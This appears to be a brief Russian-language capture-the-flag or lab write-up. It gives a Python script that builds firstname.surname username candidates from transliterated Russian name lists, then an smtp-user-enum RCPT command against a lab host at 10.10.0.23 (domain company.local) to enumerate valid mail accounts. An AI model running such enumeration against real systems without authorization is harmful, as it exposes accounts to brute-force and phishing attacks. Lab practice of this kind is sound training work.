
Создадим небольшой скрипт на питоне который прочитает файлы, возьмет первые 150 строк. объединит первый файл (имена) со вторым (фамилии), разделит точкой и затем сохранит результат в новый файл
```
with open('russian_trans_names.txt', 'r', encoding='utf-8') as f1:
    file1_words = [line.strip() for line in f1.readlines()[:150]]

with open('russian_trans_surnames.txt', 'r', encoding='utf-8') as f2:
    file2_words = [line.strip() for line in f2.readlines()[:150]]
with open('combined_file.txt', 'w', encoding='utf-8') as combined_file:
    for word1 in file1_words:
        for word2 in file2_words:
            combined_word = f"{word1}.{word2}"
            combined_file.write(combined_word + '\n')


```

smtp-user-enum -M RCPT -U ~/Downloads/YAWR-master/brute/russian_names/combined_file.txt -t 10.10.0.23 -D company.local 

забираем флаг